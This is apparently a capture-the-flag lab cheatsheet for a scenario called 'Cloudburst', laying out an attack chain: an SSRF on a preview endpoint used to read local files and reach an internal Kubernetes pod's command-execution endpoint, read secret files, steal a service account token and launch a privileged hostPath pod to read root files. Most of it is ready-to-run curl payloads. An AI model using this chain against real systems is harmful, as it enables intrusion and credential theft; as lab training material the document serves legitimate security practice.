# Cheatsheet — Cloudburst

## Targets

- **edge01** — `/preview?url=` SSRF (urllib: `file://` AND `http://` work)
- **k8s01** — kind cluster; shop pod `/exec?cmd=`, SA with prod privileges

## Useful commands

```bash
curl -s 'http://edge01/preview?url=file:///srv/app/flag.txt'
curl -s 'http://edge01/preview?url=http://k8s01/'
# everything past here is SSRF-wrapped — url-encode inner commands:
curl -s 'http://edge01/preview?url=http://k8s01/exec?cmd=touch+/tmp/.pwned'
curl -s 'http://edge01/preview?url=http://k8s01/exec?cmd=cat+/etc/labflags/api-secret.txt'
# SA token -> API (through the SSRF, inside ?cmd='curl -ks ...')
# privileged pod: metadata.namespace=prod, hostPath /host,
#   imagePullPolicy: IfNotPresent (local image!),
#   command cat /host/root/k8s-flag.txt -> read via pods/<name>/log
cat > /root/cloudburst-report.txt   # write the chain for the report flag
```

## Concepts

- SSRF as a pivot: every internal request the preview makes carries YOUR
  chosen URL — encode carefully, one nested url-encode layer.
- A pod + stolen SA token + pods.create + pods/log = node code execution
  without ever opening a shell.
